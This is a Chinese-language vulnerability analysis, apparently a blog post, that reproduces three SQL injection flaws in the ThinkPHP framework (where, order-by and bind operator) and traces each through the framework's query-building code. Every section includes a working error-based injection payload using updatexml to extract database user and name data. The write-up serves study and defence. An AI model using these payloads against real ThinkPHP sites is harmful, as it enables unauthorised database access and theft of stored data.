## where注入

### 复现

搭建环境  
![](https://image.3001.net/images/20211207/1638843224_61aec3589c1e2121aa3d2.png)  
![](https://image.3001.net/images/20211207/1638843225_61aec3596a0a9c6886446.png)  
通过id可以查询数据  
![](https://image.3001.net/images/20211207/1638843226_61aec35a4b5d8b58cb009.png)

注入payload  
`?id[where]=3%20and%201=updatexml(1,concat(0x7,(select%20name%20from%20users%20limit%201),0x7e),1)#`  
![](https://image.3001.net/images/20211207/1638843227_61aec35b5d26efc33240c.png)

### 漏洞分析

从find函数入手，跟进  
如果是数字或字符串，就会把它变为数组形式  
例如id=1，变为where=>[id=>1]  
如果不是数字或字符串  
例如id[where]=3%20and%201=updatexml(1,concat(0x7,user(),0x7e),1)#，则变为，where=>3%20and%201=updatexml(1,concat(0x7,user(),0x7e),1)#  
![](https://image.3001.net/images/20211207/1638843228_61aec35c72bfa1b775a64.png)  
继续跟进  
$this->db->select  
$this->buildSelectSql  
$this->parseSql  
![](https://image.3001.net/images/20211207/1638843229_61aec35d66906063b2d19.png)  
$this->selectSql是查询模板`'SELECT%DISTINCT% %FIELD% FROM
%TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT%
%UNION%%LOCK%%COMMENT%'`  
parseSql是直接对模板进行替换  
`SELECT * FROM `users`WHERE 3 and 1=updatexml(1,concat(0x7,(select name from
users limit 1),0x7e),1)# LIMIT 1`  
![](https://image.3001.net/images/20211207/1638843230_61aec35e91923258d3e0c.png)  
这里的parseWhere  
如果where是字符串，则直接返回，如果不是，则继续向下，解析数组  
![](https://image.3001.net/images/20211207/1638843231_61aec35fcc36ce80ff6db.png)

所以，如果传入参数是id=1，在find中，转化为where=>[id=>1]，在parseWhere中，转化为where id = 1

如果传入参数是id[where]=3 and
1=updatexml(1,concat(0x7,user(),0x7e),1)#，在find中，转化为where=>3 and
1=updatexml(1,concat(0x7,user(),0x7e),1)#  
在parseWhere中，转化为where 3 and 1=updatexml(1,concat(0x7,user(),0x7e),1)#

最后拼接到sql语句中，造成sql注入

### 总结

还是thinkphp老毛病，没对用户输入做过滤，用户数据对sql语句的形成造成了影响

## orderby注入

### 复现

![](https://image.3001.net/images/20211207/1638843518_61aec47e37c2a4bcd6b20.png)![](https://image.3001.net/images/20211207/1638843519_61aec47f2aaeb2dbac945.png)

payload

    
    
    http://tptest.cc/index.php/home/index/test2
    ?order[updatexml(1,concat(0x3a,user()),1)]=2
    &XDEBUG_SESSION_START=17221
    

![](https://image.3001.net/images/20211207/1638843520_61aec4803a3a313eac1af.png)  
复现失败  
原因是这里多个2  
![](https://image.3001.net/images/20211207/1638843521_61aec4818395d3c5a58a5.png)  
去掉2就可以了  
![](https://image.3001.net/images/20211207/1638843522_61aec48262d58c4c00f91.png)  
和网上同样的版本，同样的payload，不知道为什么多个2  
没事，调试看看

### 漏洞分析

跟踪调试  
和where注入同理，，直接对order替换，造成注入  
![](https://image.3001.net/images/20211207/1638843523_61aec4835b0bdbb25586d.png)  
为什么我的payload运行时会多出个2呢？  
这里将key和value拼接，造成的  
![](https://image.3001.net/images/20211207/1638843524_61aec484678eace38b566.png)

那我把2去掉，使value值为空就好了  
![](https://image.3001.net/images/20211207/1638843525_61aec4858981bc3d99b24.png)

### 总结

和where注入同理，几乎一模一样

## bind注入

### 复现

环境搭建  
![](https://image.3001.net/images/20211207/1638843406_61aec40ed495b39ef6362.png)  
![](https://image.3001.net/images/20211207/1638843407_61aec40fb26fb87382222.png)  
![](https://image.3001.net/images/20211207/1638843408_61aec410843efdf208dcb.png)

payload

    
    
    ?name=admin
    &age=1
    &id[]=bind
    &id[]=1 and updatexml(1,concat(0x7,(select user()),0x7e),1)
    

![](https://image.3001.net/images/20211207/1638843409_61aec4118c53c9efa3aec.png)

### 漏洞分析

先看参数  
id变为了数组，元素分别是`bind`和`1 and updatexml(1,concat(0x7,(select user()),0x7e),1)`  
先进入where看一下  
，，，什么都没做  
再进save看一下  
![](https://image.3001.net/images/20211207/1638843410_61aec412a4e94374cbca9.png)  
跟进update  
![](https://image.3001.net/images/20211207/1638843411_61aec413bd3110006bbd6.png)  
遇到了parseWhere  
然后进入了parseWhereItem  
![](https://image.3001.net/images/20211207/1638843412_61aec414c9a6ddb39dc2d.png)

bind是thinkphp自定义的一种运算符  
将key和var[1]拼接，拼接结果就是`id` = :1 and updatexml(1,concat(0x7,(select
user()),0x7e),1)  
![](https://image.3001.net/images/20211207/1638843413_61aec415f079e5d09d75b.png)

### 总结

thinkphp的注入系列都差不多，  
因为没有对用户输入进行限制，导致用户输入使用thinkphp自定义的运算符，对sql语句进行构造

